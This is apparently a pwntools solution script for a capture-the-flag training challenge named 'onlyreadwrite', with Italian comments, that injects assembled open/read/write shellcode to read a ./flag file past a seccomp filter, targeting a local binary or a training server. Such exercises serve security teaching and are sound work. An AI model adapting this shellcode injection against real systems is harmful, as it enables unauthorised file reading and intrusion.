from pwn import *

context.update(arch='amd64', os='linux')
context.terminal=['tmux','splitw','-h']


# seccomp-tools dump ./onlyreadwrite

open_file = """
mov rax, 0x2        # open vuole in rax 0x2
xor rsi, rsi
xor rdx, rdx
mov rbx, 0x67616c662f2e
push rbx
mov rdi, rsp           #ad rdi associo il pathname ./flag tu dei associare ad rdi un puntatore a ./flag, non direttamente ./flag
syscall
"""

asm_read = """
mov rsi, rdi          #inizializzo buffer con un indirizzo
mov rdi, rax          # associo il fd contenuto in RAX in rdi
mov rax, 0x0
mov rdx, 0x30
syscall
"""

asm_write = """
xor rax, rax
xor rdi, rdi
xor rdx, rdx
mov rax, 0x1          # write vuole in rax 1
mov rdi, 1            #rdi=1 stdout
mov rdx, 0x30
syscall
"""

stage = asm(open_file)
stage1 = asm(asm_read)
stage2 = asm(asm_write)


if "REMOTE" in args:

    p=remote("bin.training.offdef.it", 2006)

else:
    p=process("./onlyreadwrite")
    gdb.attach(p,"""
    #b* 0x00401551
    """)

p.send(stage+stage1+stage2)

p.interactive()

